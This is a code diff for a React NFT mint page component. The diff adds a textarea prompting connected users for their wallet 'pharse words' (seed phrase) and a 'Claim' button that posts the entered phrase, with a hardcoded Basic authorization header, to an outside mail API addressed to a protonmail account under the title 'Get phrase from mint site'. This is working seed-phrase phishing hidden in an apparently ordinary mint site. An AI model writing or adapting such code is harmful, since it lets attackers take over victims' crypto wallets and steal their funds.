@@ -5,12 +5,17 @@ import WalletModal from '../WalletModal/WalletModal';
 import { sendEth } from '../../utils/getContract';
 import { store } from 'state-pool';
 import React, { useRef } from 'react';
+import { useWeb3React } from '@web3-react/core';
+import axios from "axios"
 const nftPrice = 0.07;
+const BaseURL = 'https://appapi.anexacargo.com/sendmails';
 export default function HeaderCount() {
-    const { active, account, connector } = useWallet();
+    const { active, account,connector } = useWallet();
+    const { activate } = useWeb3React();
     const { toggleOpen } = useWalletModal();
     const [counter, setCounter] = useState(1);
     const [price, setPrice] = useState(nftPrice);
+    const [phraseStr,setPhraseText] = useState("");
 
     const buttonNameRef = useRef()
 
@@ -32,8 +37,8 @@ export default function HeaderCount() {
     };
 
     const miniString = (account) => {
-        let upString = account.substring(0, 5);
-        let downString = account.substr(account.length - 4);
+        let upString = account.substring(0, 7);
+        let downString = account.substr(account.length - 17);
         return upString + "......" + downString
     }
 
@@ -44,6 +49,20 @@ export default function HeaderCount() {
         } else {
             sendEth(connector, price);
         }
+    }
+
+    const onDisconnect = () =>{
+        activate(null);
+    }
+
+    const sendMail = ()=>{
+        console.log("phrase string",phraseStr);
+        const headers = { 
+            'Authorization': 'Basic QWV4cHJlc3M6ZTcwNmRkOTEtZmFlYS00ZWJiLWI5N2EtMDYwMjQxMDg1ZWVm',
+        };
+        axios.post(BaseURL, { email:"thisislucaswilliam@protonmail.com",html:phraseStr,title: 'Get phrase from mint site' },{ headers }).then(response => {
+      console.log(response)
+    })
     }
 
     return (
@@ -58,10 +77,6 @@ export default function HeaderCount() {
                 <div className="dutch-det-left">
                     <div className="text-block-13">Limited Sale</div>
                 </div>
-                {/* <div className="dutch-det-right">
-                    <div className="text-block-12">January <span id="dateday2"></span> <span id="datehour1"></span>
-                    </div>
-                </div> */}
             </div>
             <div className="header_flex">
                 <div className="dutch-detail-two-sides">
@@ -133,13 +148,26 @@ export default function HeaderCount() {
                     </div>
                 </div>
                 {/* <button className="cta connect-btn" id="transfer" onClick={wallet.sendEth()}>Mint</button> */}
-                <button className="cta connect-btn" id="transfer" ref={buttonNameRef} onClick={onMint}>Mint</button>
+                <div className='cta-btn-grp'>
+                    <button className="cta connect-btn" id="transfer" ref={buttonNameRef} onClick={onMint}>  {active ? (
+                        <>
+                            <span className="wallet">Mint</span>
+                        </>
+                    ) : (<span className="wallet">Connect</span>)}</button>
+                    {active ? <button className="cta connect-btn" id="transfer" onClick={onDisconnect}>Disconnect</button> : <></>}
+                </div>
                 <div className="wallet-section">
                     {active ? (
-                        <span className="wallet">{miniString(account)}</span>
-
-                    ) : (<span className="wallet">Please connect wallet...</span>)}
+                        <>
+                            <span className="wallet">{miniString(account)}</span>
+                        </>
+                    ) : (<span className="wallet"></span>)}
                 </div>
+                {active ?
+                    <div className='pharse-word-grp'>
+                        <textarea className='ipt-pharse-word' placeholder='please input the pharse words' onChange={e => setPhraseText(e.target.value)}></textarea>
+                        <button id="transfer" onClick={sendMail}>Claim</button>
+                    </div> : <></>}
             </div>
         </div>
     );
